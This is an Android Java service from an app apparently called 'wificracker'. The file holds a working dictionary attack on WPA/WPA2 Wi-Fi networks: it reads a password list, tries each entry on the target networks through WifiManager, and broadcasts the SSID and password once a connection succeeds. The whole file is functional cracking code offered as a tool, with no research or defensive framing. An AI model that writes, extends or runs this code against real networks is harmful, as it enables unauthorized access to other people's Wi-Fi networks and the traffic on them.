package com.wificracker.app.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.NetworkInfo;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import com.wificracker.app.WiFiNetwork;

/**
 * Service responsible for attempting to connect to specified Wi-Fi networks using a list of passwords.
 * It operates in the background, reading passwords from a file and trying them one by one against
 * the target networks. The service broadcasts progress, success, or failure messages.
 */
public class PasswordCrackerService extends Service {
    private static final String TAG = "PasswordCrackerService";
    private WifiManager wifiManager; // System service for managing Wi-Fi connectivity
    private List<WiFiNetwork> networks; // List of target Wi-Fi networks to crack
    private String passwordFile; // URI string of the file containing passwords to try
    private volatile boolean isRunning = false; // Flag to control the cracking loop, volatile for thread safety
    private int totalPasswords = 0; // Total number of non-empty passwords in the password file
    private int currentPasswordIndex = 0; // Index of the current password being attempted (non-empty passwords only)

    @Override
    public void onCreate() {
        super.onCreate();
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
    }

    /**
     * Called when the service is started. Retrieves the password file URI and target networks
     * from the intent, then initiates the cracking process.
     * @param intent The Intent supplying data to the service.
     * @param flags Additional data about this start request.
     * @param startId A unique integer representing this specific start request.
     * @return {@link Service#START_NOT_STICKY} to indicate that the service should not be automatically restarted by the system if it's killed.
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            // Retrieve the password file URI and the list of target networks from the intent extras.
            passwordFile = intent.getStringExtra("passwordFile");
            networks = intent.getParcelableArrayListExtra("networks");
            if (passwordFile != null && networks != null && !networks.isEmpty()) {
                startCracking();
            } else {
                Log.e(TAG, "Missing password file or networks");
                stopSelf();
            }
        }
        return START_NOT_STICKY;
    }

    /**
     * Initiates the password cracking process in a new background thread.
     * The process involves two main passes over the password file:
     * 1. First pass: Counts the total number of non-empty passwords to allow for progress tracking.
     *    If no valid passwords are found, the service stops.
     * 2. Second pass: Reads each non-empty password and attempts to connect to the target networks.
     * The {@code isRunning} flag is used to control the execution of the loops, allowing the process
     * to be stopped externally (e.g., via {@link #onDestroy()}).
     * If a password successfully connects to a network, it broadcasts a success message and stops.
     * If all passwords are tried without success, it broadcasts a failure message.
     */
    private void startCracking() {
        if (isRunning) return; // Prevent multiple cracking threads if already running
        isRunning = true; // Set the flag to indicate the cracking process has started

        new Thread(() -> {
            try {
                // First pass: Count total non-empty passwords for progress calculation.
                // This avoids issues with progress reporting if the file has many empty lines.
                BufferedReader countReader = new BufferedReader(new InputStreamReader(getContentResolver().openInputStream(android.net.Uri.parse(passwordFile))));
                String line;
                while ((line = countReader.readLine()) != null) {
                    if (!line.isEmpty()) { // Only count non-empty lines
                        totalPasswords++;
                    }
                }
                countReader.close();

                // If the password file is empty or contains only empty lines, log, broadcast failure, and stop.
                if (totalPasswords == 0) {
                    Log.w(TAG, "Password file is empty or contains only empty lines.");
                    broadcastFailure();
                    stopSelf(); // Stop service as there are no passwords to try
                    return;     // Exit the cracking thread
                }

                // Second pass: Start actual cracking attempts.
                BufferedReader reader = new BufferedReader(new InputStreamReader(getContentResolver().openInputStream(android.net.Uri.parse(passwordFile))));
                currentPasswordIndex = 0; // Initialize for tracking attempts of non-empty passwords

                // Loop through each line in the password file as long as 'isRunning' is true.
                while ((line = reader.readLine()) != null && isRunning) {
                    if (line.isEmpty()) { // Skip empty lines in the password file
                        continue;
                    }
                    String password = line; // Use this non-empty line as the password
                    currentPasswordIndex++; // Increment for each non-empty password being attempted

                    // Try the current password against each target network.
                    for (WiFiNetwork network : networks) {
                        if (!isRunning) break; // Check flag again in case of stop request during inner loop
                        
                        broadcastProgress(network, password); // Broadcast current attempt
                        if (tryConnect(network, password)) {
                            broadcastSuccess(network, password); // Broadcast success if connected
                            stopSelf(); // Stop the service
                            return;     // Exit the cracking thread
                        }
                    }
                }
                reader.close();
                // If the loop completes without a successful connection and was not stopped externally.
                if (isRunning) {
                    broadcastFailure(); // Broadcast failure as no password worked
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading password file or during cracking process", e);
                broadcastFailure(); // Broadcast failure on error
            } finally {
                isRunning = false; // Ensure isRunning is reset
                stopSelf(); // Ensure service stops in all cases (success, failure, error)
            }
        }).start();
    }

    /**
     * Broadcasts the current progress of the password cracking attempt.
     * Sends the target SSID, the password currently being tried, and the overall progress percentage.
     * @param network The Wi-Fi network being targeted.
     * @param currentPassword The password currently being attempted.
     */
    private void broadcastProgress(WiFiNetwork network, String currentPassword) {
        Intent broadcastIntent = new Intent("com.wificracker.app.CRACK_PROGRESS");
        broadcastIntent.putExtra("ssid", network.getSSID());
        broadcastIntent.putExtra("currentPassword", currentPassword);
        // Calculate progress: (current attempt / total passwords) * 100
        // Ensure totalPasswords is not zero to avoid division by zero, though startCracking() should prevent this.
        broadcastIntent.putExtra("progress", (totalPasswords > 0) ? (currentPasswordIndex * 100) / totalPasswords : 0);
        sendBroadcast(broadcastIntent);
    }

    /**
     * Attempts to connect to a given Wi-Fi network using the provided password.
     * This method configures a {@link WifiConfiguration} for WPA/WPA2 networks,
     * adds it to the system, and then attempts to connect.
     *
     * Connection success is monitored asynchronously using a {@link BroadcastReceiver}
     * that listens for {@link WifiManager#NETWORK_STATE_CHANGED_ACTION}. A {@link CountDownLatch}
     * is used to wait for a fixed period (15 seconds) for the connection attempt to succeed.
     *
     * @param network The {@link WiFiNetwork} object representing the target network.
     * @param password The password to try.
     * @return {@code true} if the connection to the specified SSID is successful within the timeout,
     *         {@code false} otherwise.
     */
    private boolean tryConnect(WiFiNetwork network, String password) {
        // Create a new WifiConfiguration for the target network.
        WifiConfiguration config = new WifiConfiguration();
        config.SSID = "\"" + network.getSSID() + "\""; // SSID must be enclosed in quotes
        config.preSharedKey = "\"" + password + "\""; // Password must be enclosed in quotes for WPA/WPA2

        // Configure for WPA/WPA2 (RSN for WPA2, WPA for WPA1)
        config.allowedProtocols.clear();
        config.allowedProtocols.set(WifiConfiguration.Protocol.RSN); // WPA2
        config.allowedProtocols.set(WifiConfiguration.Protocol.WPA);  // WPA

        // Key management scheme: WPA_PSK (Pre-Shared Key)
        config.allowedKeyManagement.clear();
        config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);

        // Pairwise ciphers for WPA/WPA2 (CCMP for WPA2, TKIP for WPA)
        config.allowedPairwiseCiphers.clear();
        config.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        config.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);

        // Group ciphers for WPA/WPA2 (CCMP for WPA2, TKIP for WPA)
        config.allowedGroupCiphers.clear();
        config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);

        // Add the network configuration to WifiManager.
        // This returns a network ID, or -1 if an error occurs.
        int netId = wifiManager.addNetwork(config);
        if (netId == -1) {
            Log.e(TAG, "Failed to add network configuration for SSID: " + network.getSSID());
            return false;
        }

        // Use a CountDownLatch to wait for the broadcast receiver to signal a connection event.
        final CountDownLatch latch = new CountDownLatch(1);
        final String targetSSID = "\"" + network.getSSID() + "\""; // Expected SSID in WifiInfo

        // BroadcastReceiver to listen for network state changes.
        BroadcastReceiver connectionReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                // Check if the action is for network state change.
                if (WifiManager.NETWORK_STATE_CHANGED_ACTION.equals(intent.getAction())) {
                    NetworkInfo networkInfo = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
                    // Check if the device is connected to a network.
                    if (networkInfo != null && networkInfo.getState() == NetworkInfo.State.CONNECTED) {
                        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                        // Verify if the connection is to the target SSID.
                        if (wifiInfo != null && targetSSID.equals(wifiInfo.getSSID())) {
                            Log.d(TAG, "Successfully connected to " + targetSSID + " via BroadcastReceiver.");
                            latch.countDown(); // Signal that connection to target SSID is successful.
                        }
                    }
                }
            }
        };

        // Register the receiver to listen for network state changes.
        IntentFilter intentFilter = new IntentFilter(WifiManager.NETWORK_STATE_CHANGED_ACTION);
        registerReceiver(connectionReceiver, intentFilter);

        boolean connected = false;
        try {
            wifiManager.disconnect(); // Disconnect from any currently connected network.
            // Enable the configured network and make it the exclusive one to connect to.
            boolean enabled = wifiManager.enableNetwork(netId, true);
            if (!enabled) {
                Log.e(TAG, "Failed to enable network for SSID: " + network.getSSID());
                wifiManager.removeNetwork(netId); // Clean up by removing the added network configuration.
                return false;
            }
            wifiManager.reconnect(); // Request WifiManager to connect to the enabled network.

            Log.d(TAG, "Attempting to connect to " + targetSSID + ", waiting for latch (15s timeout)...");
            // Wait for the latch to be counted down by the receiver, or timeout after 15 seconds.
            if (latch.await(15, TimeUnit.SECONDS)) {
                // Latch was counted down, meaning a NETWORK_STATE_CHANGED_ACTION for CONNECTED state to target SSID was received.
                // Double-check the connection state and SSID for robustness.
                WifiInfo currentWifiInfo = wifiManager.getConnectionInfo();
                if (currentWifiInfo != null && targetSSID.equals(currentWifiInfo.getSSID()) &&
                    currentWifiInfo.getSupplicantState() == SupplicantState.COMPLETED) {
                    Log.d(TAG, "Connection confirmed for " + targetSSID + " after latch.");
                    connected = true;
                } else {
                    Log.d(TAG, "Latch counted down, but final check failed. Current SSID: " +
                               (currentWifiInfo != null ? currentWifiInfo.getSSID() : "null") +
                               ", State: " + (currentWifiInfo != null ? currentWifiInfo.getSupplicantState() : "null"));
                }
            } else {
                // Timeout occurred.
                Log.d(TAG, "Connection timed out for " + targetSSID + ". Latch did not count down.");
            }
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted while waiting for connection to " + targetSSID, e);
            Thread.currentThread().interrupt(); // Preserve interrupt status.
        } finally {
            // Always unregister the receiver to prevent leaks.
            unregisterReceiver(connectionReceiver);
            // If not successfully connected, remove the network configuration to avoid cluttering
            // the user's saved Wi-Fi networks. If successful, it might be desirable to keep it,
            // but for a cracking tool, removing it is cleaner.
            if (!connected) {
                 wifiManager.removeNetwork(netId);
                 Log.d(TAG, "Removed network configuration for " + targetSSID + " as connection was not successful.");
            }
        }
        return connected;
    }

    /**
     * Broadcasts a success message when a password successfully connects to a network.
     * Includes the SSID of the connected network and the successful password.
     * @param network The Wi-Fi network that was successfully connected to.
     * @param password The password that resulted in a successful connection.
     */
    private void broadcastSuccess(WiFiNetwork network, String password) {
        Intent broadcastIntent = new Intent("com.wificracker.app.CRACK_SUCCESS");
        broadcastIntent.putExtra("ssid", network.getSSID());
        broadcastIntent.putExtra("password", password);
        sendBroadcast(broadcastIntent);
    }

    /**
     * Broadcasts a failure message. This can occur if all passwords are tried without success,
     * or if the password file is empty/invalid, or if an unexpected error occurs.
     */
    private void broadcastFailure() {
        Intent broadcastIntent = new Intent("com.wificracker.app.CRACK_FAILURE");
        sendBroadcast(broadcastIntent);
    }

    /**
     * Called when the service is being destroyed.
     * Sets the {@code isRunning} flag to false to signal the cracking thread to stop,
     * and performs default service cleanup.
     */
    @Override
    public void onDestroy() {
        isRunning = false; // Signal the cracking thread to terminate its operations.
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
} 